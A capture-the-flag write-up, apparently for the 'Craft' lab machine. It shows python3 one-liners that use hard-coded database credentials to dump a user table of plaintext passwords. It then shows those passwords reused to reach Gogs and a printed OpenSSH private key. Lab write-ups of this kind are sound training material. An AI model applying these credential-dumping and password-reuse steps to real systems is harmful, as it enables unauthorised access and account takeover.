## CREDENTIALS

```python
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

Unfortunately, being in a container we do not have mysql or other tools to interface with a mysql database, but we do have the code of the application that can. Therefore copy the following script to 

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

Since we are in a very limited environment what we will do is execute this command the following way:

```bash
python3 -c "import pymysql; from craft_api import settings; connection = pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft',cursorclass=pymysql.cursors.DictCursor); cursor = connection.cursor(); sql = 'SHOW TABLES;'; cursor.execute(sql); result=cursor.fetchone(); print(result)"
```

sql_query = 'SELECT * FROM information_schema.tables'

```json
{'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION': 10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 2339, 'AVG_ROW_LENGTH': 105, 'DATA_LENGTH': 245760, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': 2351, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 11), 'UPDATE_TIME': datetime.datetime(2024, 12, 5, 17, 16, 57), 'CHECK_TIME': None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''}
```

sql_query = 'SHOW DATABASES;'

```json
{'Database': 'craft'}
```

sql_query = 'SHOW TABLES;'

```json
{'Tables_in_craft': 'brew'}
```

sql_query = 'SELECT * FROM brew'

```json
{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'style': 'American Pale Lager', 'abv': Decimal('0.050')}
```

Well this is kinda useless

-> for some reason there is a table missing ??? (looking at the walkthrough. kill the machine and start over)

-> after a lot of useless recon i remembered that the cursor calls .fetchone, so i wasn't seeing the rest of rows :).

Now the proper script is 

```python
python3 -c "import pymysql; from craft_api import settings; connection = pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft',cursorclass=pymysql.cursors.DictCursor); cursor = connection.cursor(); sql = 'SELECT * FROM user;'; cursor.execute(sql); result=cursor.fetchall(); print(result)"
```

sql_query = 'SHOW TABLES;'

```json
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
```

sql_query = 'SELECT * FROM user'

```json
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

After stuffing these passwords into gogs to obtain access to information of gilfoyle. Upon entering we are greeted with an ssh private key ;)

```txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
-----END OPENSSH PRIVATE KEY-----
```

The private key is protected with a passphrase, but it is the same password gilfoyle had for gogs so it is not much of a problem. We are now [[gilfoyle]].